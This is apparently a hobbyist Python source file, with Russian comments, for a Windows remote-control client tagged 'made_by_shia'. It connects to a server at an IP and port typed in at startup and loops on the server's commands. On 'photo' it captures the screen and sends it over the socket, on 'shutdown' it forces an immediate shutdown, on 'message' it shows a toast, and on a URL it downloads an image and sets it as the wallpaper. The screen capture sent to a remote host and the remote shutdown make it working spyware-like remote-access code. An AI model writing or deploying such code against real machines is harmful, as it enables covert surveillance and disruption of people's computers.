import socket
import mss
import os
import sys
import win10toast
import time
import ctypes
import requests


port=int(input("Enter the PORT --> "))

def download_image(url, save_path):  # скачивание фото
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Проверка на ошибки

        with open(save_path, 'wb') as file:
            for chunk in response.iter_content(1024):
                file.write(chunk)
        print(f"Изображение сохранено как {save_path}")
    except Exception as e:
        print(f"Ошибка при загрузке: {e}")


def change_wallpaper(image_path):  # смена обоев
    SPI_SET_DESKWALLPAPER = 20
    SPIF_UPDATEINIFFILE = 0x01
    SPIF_SENDWININICHANGE = 0x02

    try:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SET_DESKWALLPAPER, 0, image_path,
                                                   SPIF_UPDATEINIFFILE | SPIF_SENDWININICHANGE)
        return True
    except Exception as e:
        print(f'Error changing wallpaper: {e}')
        return False

def send_photo(client_socket):
    with mss.mss() as sct:
        sct.shot(output='shia.png')
    file = open('shia.png', 'rb')
    image_data = file.read(100000000)

    while image_data:
        client_socket.send(image_data)
        image_data = file.read(100000000)

def client_program():
    host = input('enter the IP--> ')
    save_location = "made_by_shia.jpg"  # Имя файла для сохранения
    file_path = os.path.dirname(sys.executable)

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))
    except:
        print('Unable to connect')


    data = client_socket.recv(2048)
    message = str(data.decode())
    if message=='photo':
        send_photo(client_socket)
        print(f"photo {file_path} succesful send!")
    if message=='shutdown':
        os.system('shutdown -s -t 0')
    if message=='message':
        toaster = win10toast.ToastNotifier()
        toaster.show_toast("made_by_shia", "have a nice day ;)")
    if message.startswith(("https", "http")):
        download_image(message, save_location)
        time.sleep(3)
        path_wallpaper = rf"{os.getcwd()}\{save_location}"
        if change_wallpaper(path_wallpaper):
            print(None)  # если успешно можем вывести что либо
        else:
            print(None)  # если не успешн

    client_socket.close()


if __name__ == '__main__':
    while True:
        client_program()